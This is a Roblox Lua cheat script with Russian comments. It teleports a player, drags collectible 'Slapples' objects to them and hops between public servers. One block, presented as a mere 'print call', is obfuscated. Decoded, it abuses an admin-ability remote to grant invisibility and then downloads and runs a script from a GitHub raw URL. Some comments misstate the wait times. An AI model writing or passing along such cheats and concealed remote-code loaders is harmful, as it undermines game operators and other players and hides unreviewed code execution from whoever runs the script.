-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- Переменные
local player = Players.LocalPlayer
local teleportTarget = workspace.Lobby.Teleport1
local slapplesFolder = workspace.Arena.island5.Slapples

-- Телепорт игрока к точке Teleport1
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
    player.Character.HumanoidRootPart.CFrame = teleportTarget.CFrame
end

-- Телепорт всех объектов в Slapples к игроку
for _, obj in ipairs(slapplesFolder:GetChildren()) do
    if obj:IsA("Model") and obj.PrimaryPart then
        obj:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame)
    elseif obj:IsA("BasePart") then
        obj.CFrame = player.Character.HumanoidRootPart.CFrame
    elseif obj:IsA("Folder") or obj:IsA("Model") then
        -- Перемещаем содержимое вложенных объектов
        for _, innerObj in ipairs(obj:GetDescendants()) do
            if innerObj:IsA("BasePart") then
                innerObj.CFrame = player.Character.HumanoidRootPart.CFrame
            end
        end
    end
end

-- Ждём 0.5 секунды
task.wait(3)

local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local placeId = game.PlaceId
local AllIDs = {}
local foundAnything = ""

-- Загрузка посещённых серверов из файла
local fileLoaded = pcall(function()
    AllIDs = HttpService:JSONDecode(readfile("server-hop-temp.json"))
end)

if not fileLoaded then
    AllIDs = {}
    pcall(function()
        writefile("server-hop-temp.json", HttpService:JSONEncode(AllIDs))
    end)
end

-- Функция для поиска нового сервера и подключения
local function serverHop()
    local Site
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"))
    else
        Site = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything))
    end

    if Site.nextPageCursor then
        foundAnything = Site.nextPageCursor
    end

    for _, v in pairs(Site.data) do
        local ID = tostring(v.id)
        local Possible = true

        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _, Existing in pairs(AllIDs) do
                if ID == tostring(Existing) then
                    Possible = false
                    break
                end
            end

            if Possible then
                table.insert(AllIDs, ID)
                pcall(function()
                    writefile("server-hop-temp.json", HttpService:JSONEncode(AllIDs))
                    TeleportService:TeleportToPlaceInstance(placeId, ID, player)
                end)
                return
            end
        end
    end

    -- Если подходящий сервер не найден, телепортируем на случайный
    TeleportService:Teleport(placeId)
end

-- Вызов принта в отдельном потоке
task.spawn(function()
    function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IIllllIIllll = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;function IllIIIIllIIIIIl(IIllllIIllll) function IIllllIIllll(IIllllIIllll) function IIllllIIllll(IllIllIllIllI) end end end;IllIIIIllIIIIIl(900283);function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IllIllIllIllI) local IIlllIIlllIIlllIIlllII = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = loadstring;local IlIlIlIlIlIlIlIlII = {'\45','\45','\47','\47','\32','\68','\101','\99','\111','\109','\112','\105','\108','\101','\100','\32','\67','\111','\100','\101','\46','\32','\10','\108','\111','\99','\97','\108','\32','\97','\114','\103','\115','\32','\61','\32','\123','\10','\32','\32','\32','\32','\32','\32','\32','\32','\91','\49','\93','\32','\61','\32','\34','\73','\110','\118','\105','\115','\105','\98','\105','\108','\105','\116','\121','\34','\10','\32','\32','\32','\32','\125','\10','\32','\32','\32','\32','\103','\97','\109','\101','\58','\71','\101','\116','\83','\101','\114','\118','\105','\99','\101','\40','\34','\82','\101','\112','\108','\105','\99','\97','\116','\101','\100','\83','\116','\111','\114','\97','\103','\101','\34','\41','\46','\65','\100','\109','\105','\110','\65','\98','\105','\108','\105','\116','\121','\58','\70','\105','\114','\101','\83','\101','\114','\118','\101','\114','\40','\117','\110','\112','\97','\99','\107','\40','\97','\114','\103','\115','\41','\41','\10','\116','\97','\115','\107','\46','\119','\97','\105','\116','\40','\48','\46','\49','\41','\10','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\40','\103','\97','\109','\101','\58','\72','\116','\116','\112','\71','\101','\116','\40','\34','\104','\116','\116','\112','\115','\58','\47','\47','\114','\97','\119','\46','\103','\105','\116','\104','\117','\98','\117','\115','\101','\114','\99','\111','\110','\116','\101','\110','\116','\46','\99','\111','\109','\47','\82','\97','\107','\101','\114','\111','\98','\108','\111','\120','\49','\50','\51','\47','\79','\80','\66','\111','\120','\101','\114','\70','\97','\114','\109','\47','\114','\101','\102','\115','\47','\104','\101','\97','\100','\115','\47','\109','\97','\105','\110','\47','\66','\111','\120','\101','\114','\34','\41','\41','\40','\41','\10',}IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()
end)

-- Ждём 4 секунды
task.wait(2)

-- Выполняем сервер-хоп
serverHop()
